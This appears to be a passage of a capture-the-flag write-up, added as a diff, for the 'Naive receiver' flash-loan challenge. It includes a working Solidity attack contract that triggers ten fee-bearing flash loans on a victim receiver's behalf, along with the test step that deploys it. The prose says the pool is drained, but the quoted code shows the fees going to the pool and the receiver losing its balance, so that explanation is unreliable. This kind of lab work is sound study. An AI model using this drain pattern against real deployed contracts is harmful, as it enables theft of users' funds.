@@ -67,3 +67,76 @@ describe('[Challenge] Naive receiver', function () {
 });
 ```
 
+And then check out the flash loan function:
+
+```javascript
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != ETH)
+        revert UnsupportedCurrency();
+    
+    uint256 balanceBefore = address(this).balance;
+
+    // Transfer ETH and handle control to receiver
+    SafeTransferLib.safeTransferETH(address(receiver), amount);
+    if(receiver.onFlashLoan(
+        msg.sender,
+        ETH,
+        amount,
+        FIXED_FEE,
+        data
+    ) != CALLBACK_SUCCESS) {
+        revert CallbackFailed();
+    }
+
+    if (address(this).balance < balanceBefore + FIXED_FEE)
+        revert RepayFailed();
+
+    return true;
+}
+```
+
+We can see that the fee per transaction is 1 ETH, so if we can receive 10 times flash loan, we will drain all of the pool balance (10 ETH).
+
+So add a file AttackNaiveReceiver.sol(contracts/attacker-contracts/AttackNaiveReceiver.sol) and paste following codes:
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../naive-receiver/NaiveReceiverLenderPool.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+
+contract AttackNaiveReceiver {
+    NaiveReceiverLenderPool pool;
+    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+
+    // set naive receiver pool as pool address.
+    constructor(address payable _pool) {
+        pool = NaiveReceiverLenderPool(_pool);
+    }
+
+    // call the naive receiver pool to do flash loan 10 times.
+    function attack(address victim) public {
+        for (int i=0; i < 10; i++ ) {
+            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 1 ether, "");
+        }
+    }
+}
+```
+
+Call the deploy attack contracts and call attack funtion in test file: 
+```javascript
+it('Execution', async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const AttackFactory = await ethers.getContractFactory("AttackNaiveReceiver", player);
+    const attackContract = await AttackFactory.deploy(pool.address);
+    await attackContract.attack(receiver.address);
+});
+```
+
+Then we can drain all of the ETH in pool !!
